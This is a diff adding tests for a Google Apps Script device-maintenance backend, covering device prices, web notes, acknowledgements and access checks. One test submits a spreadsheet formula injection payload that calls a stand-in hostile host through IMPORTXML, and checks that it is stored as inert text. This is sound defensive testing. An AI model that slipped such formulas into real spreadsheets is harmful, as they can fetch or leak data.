@@ -91,6 +91,28 @@ describe('Code.gs', () => {
       assert.deepEqual(device.tasks, [{ id: 1, name: 't', intervalDays: 30 }]);
     });
 
+    it('model ve fiyatı saklar; geçersiz fiyatı atar', () => {
+      backend.post(
+        owner({
+          action: 'putDevices',
+          devices: [
+            { id: 7, name: 'Yazıcı', room: 'x', modelInfo: 'Epson EcoTank L3250', price: 8489.5 },
+            { id: 8, name: 'Fiyatsız', room: 'x', modelInfo: '', price: -5 },
+            { id: 9, name: 'Metin fiyat', room: 'x', price: 'pahalı' },
+          ],
+        }),
+      );
+
+      const priced = backend.get({ action: 'device', ...visitor(7) }).device;
+      assert.equal(priced.modelInfo, 'Epson EcoTank L3250');
+      assert.equal(priced.price, 8489.5);
+
+      const unpriced = backend.get({ action: 'device', ...visitor(8) }).device;
+      assert.equal('price' in unpriced, false);
+      assert.equal('modelInfo' in unpriced, false, 'boş model saklanmaz');
+      assert.equal('price' in backend.get({ action: 'device', ...visitor(9) }).device, false);
+    });
+
     it('çok fazla cihaz tek seferde kabul edilmez', () => {
       const devices = Array.from({ length: 201 }, (_, i) => ({ id: i + 100, name: 'x', room: 'y' }));
       assert.deepEqual(backend.post(owner({ action: 'putDevices', devices })), { ok: false, error: 'too_many_devices' });
@@ -277,6 +299,104 @@ describe('Code.gs', () => {
     });
   });
 
+  describe('web notu', () => {
+    const noteOf = (id, text) => backend.post({ action: 'note', ...visitor(id, { text }) });
+
+    it('not kaydedilir, sayfa yenilenince ve sahip çekince görünür', () => {
+      assert.deepEqual(noteOf(3, '  Filtre: F-12  '), { ok: true, notes: 'Filtre: F-12' });
+
+      assert.equal(backend.get({ action: 'device', ...visitor(3) }).device.notes, 'Filtre: F-12');
+      const { notes } = backend.get(owner({ action: 'pull' }));
+      assert.equal(notes.length, 1);
+      assert.equal(notes[0].deviceId, 3);
+      assert.equal(notes[0].text, 'Filtre: F-12');
+      assert.ok(notes[0].noteId && notes[0].editedAt);
+    });
+
+    it('aynı cihazın ikinci notu birincinin yerine geçer ve yeni numara alır', () => {
+      noteOf(3, 'birinci');
+      const first = backend.get(owner({ action: 'pull' })).notes[0];
+      noteOf(3, 'ikinci');
+
+      const { notes } = backend.get(owner({ action: 'pull' }));
+      assert.equal(notes.length, 1);
+      assert.equal(notes[0].text, 'ikinci');
+      assert.notEqual(notes[0].noteId, first.noteId);
+    });
+
+    it('notu silmek (boş metin) cihazın notunu kaldırır', () => {
+      backend.post(owner({ action: 'putDevices', devices: [{ ...coffeeMachine, notes: 'eski not' }] }));
+      assert.equal(backend.get({ action: 'device', ...visitor(3) }).device.notes, 'eski not');
+
+      noteOf(3, '   ');
+
+      assert.equal('notes' in backend.get({ action: 'device', ...visitor(3) }).device, false);
+      assert.equal(backend.get(owner({ action: 'pull' })).notes[0].text, '');
+    });
+
+    it('bekleyen not saklanan cihaz notunun önüne geçer; telefon onaylayıp gönderince onun değeri geçerli olur', () => {
+      backend.post(owner({ action: 'putDevices', devices: [{ ...coffeeMachine, notes: 'telefondaki' }] }));
+      noteOf(3, 'webdeki');
+      assert.equal(backend.get({ action: 'device', ...visitor(3) }).device.notes, 'webdeki');
+
+      const [note] = backend.get(owner({ action: 'pull' })).notes;
+      backend.post(owner({ action: 'ack', noteIds: [note.noteId] }));
+      backend.post(owner({ action: 'putDevices', devices: [{ ...coffeeMachine, notes: 'webdeki, telefonda düzeltildi' }] }));
+
+      assert.equal(backend.get({ action: 'device', ...visitor(3) }).device.notes, 'webdeki, telefonda düzeltildi');
+    });
+
+    it('onaylanan not bir daha gelmez; onay beklerken yazılan yeni not onaydan etkilenmez', () => {
+      noteOf(3, 'birinci');
+      const [first] = backend.get(owner({ action: 'pull' })).notes;
+      noteOf(3, 'ikinci'); // telefon birinciyi çekmiş ama henüz onaylamamış
+
+      const ack = backend.post(owner({ action: 'ack', noteIds: [first.noteId] }));
+
+      assert.deepEqual(ack, { ok: true, acknowledged: 0, notesAcknowledged: 0 });
+      const [second] = backend.get(owner({ action: 'pull' })).notes;
+      assert.equal(second.text, 'ikinci');
+
+      assert.equal(backend.post(owner({ action: 'ack', noteIds: [second.noteId] })).notesAcknowledged, 1);
+      assert.deepEqual(backend.get(owner({ action: 'pull' })).notes, []);
+    });
+
+    it('başka cihazın anahtarıyla, yanlış anahtarla ve bilinmeyen cihaza not yazılamaz', () => {
+      assert.deepEqual(backend.post({ action: 'note', id: 3, k: keyFor(4), text: 'x' }), { ok: false, error: 'forbidden' });
+      assert.deepEqual(backend.post({ action: 'note', id: 3, k: 'yanlis', text: 'x' }), { ok: false, error: 'forbidden' });
+      assert.deepEqual(noteOf(99, 'x'), { ok: false, error: 'not_found' });
+      assert.deepEqual(backend.get(owner({ action: 'pull' })).notes, []);
+    });
+
+    it('metin olmayan ya da çok uzun not reddedilir', () => {
+      assert.deepEqual(noteOf(3, 42), { ok: false, error: 'bad_request' });
+      assert.deepEqual(noteOf(3, undefined), { ok: false, error: 'bad_request' });
+      assert.deepEqual(noteOf(3, 'a'.repeat(2001)), { ok: false, error: 'too_long' });
+      assert.equal(noteOf(3, 'a'.repeat(2000)).ok, true);
+    });
+
+    it('formül gibi görünen not Sheet e metin olarak yazılır', () => {
+      noteOf(3, '=IMPORTXML("https://kotu.example","//a")');
+
+      const cell = backend.sheets.get('Notlar').rows[1][2];
+      assert.ok(cell.startsWith('"'), 'JSON olarak saklanır, "=" ile başlamaz');
+      assert.equal(backend.get(owner({ action: 'pull' })).notes[0].text, '=IMPORTXML("https://kotu.example","//a")');
+    });
+
+    it('sahip eylemleri ziyaretçi anahtarıyla çalışmaz: not çekme ve onay', () => {
+      noteOf(3, 'x');
+      assert.deepEqual(backend.get({ action: 'pull', key: keyFor(3) }), { ok: false, error: 'forbidden' });
+      assert.deepEqual(backend.post({ action: 'ack', key: keyFor(3), noteIds: ['x'] }), { ok: false, error: 'forbidden' });
+    });
+
+    it('cihaz silinince bekleyen notu da silinir', () => {
+      noteOf(3, 'x');
+      backend.post(owner({ action: 'deleteDevice', id: 3 }));
+
+      assert.deepEqual(backend.get(owner({ action: 'pull' })).notes, []);
+    });
+  });
+
   describe('çekme ve onaylama', () => {
     it('onaylanan kayıtlar bir daha gelmez, onaylanmayanlar kalır', () => {
       backend.post({ action: 'record', ...visitor(3, { taskIds: [11, 12] }) });
@@ -284,7 +404,7 @@ describe('Code.gs', () => {
 
       const ack = backend.post(owner({ action: 'ack', ids: [first.recordId, 'olmayan-kayit'] }));
 
-      assert.deepEqual(ack, { ok: true, acknowledged: 1 });
+      assert.deepEqual(ack, { ok: true, acknowledged: 1, notesAcknowledged: 0 });
       assert.deepEqual(
         backend.get(owner({ action: 'pull' })).records.map((r) => r.recordId),
         [second.recordId],
@@ -302,7 +422,7 @@ describe('Code.gs', () => {
     });
 
     it('kayıt yoksa boş liste döner', () => {
-      assert.deepEqual(backend.get(owner({ action: 'pull' })), { ok: true, records: [] });
+      assert.deepEqual(backend.get(owner({ action: 'pull' })), { ok: true, records: [], notes: [] });
     });
   });
 });
